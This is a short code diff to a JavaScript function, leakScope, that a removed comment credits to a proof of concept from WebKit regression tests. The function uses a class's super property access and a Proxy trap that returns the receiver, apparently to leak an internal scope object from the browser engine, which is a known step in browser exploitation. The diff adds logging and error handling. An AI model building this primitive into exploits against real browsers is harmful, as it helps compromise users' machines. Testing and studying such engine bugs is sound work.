@@ -1,6 +1,5 @@
-// from a poc from webkits regression tests
-
 function leakScope() {
+    try {
         class Leaker {
             leak() {
                 return super.foo;
@@ -9,12 +8,19 @@ function leakScope() {
 
         Leaker.prototype.__proto__ = new Proxy({}, {
             get(target, propertyName, receiver) {
+                log("[proxy trap] target: " + target + ", property: " + propertyName);
                 return receiver;
             }
         });
 
         const foo = 42;
-        const {leak} = Leaker.prototype;
+        const { leak } = Leaker.prototype;
 
-        return (() => leak())();
+        let res = (() => leak())();
+        log("scope leak success: " + res);
+        return res;
+    } catch (e) {
+        log("leakScope() threw: " + e);
+        return null;
+    }
 }
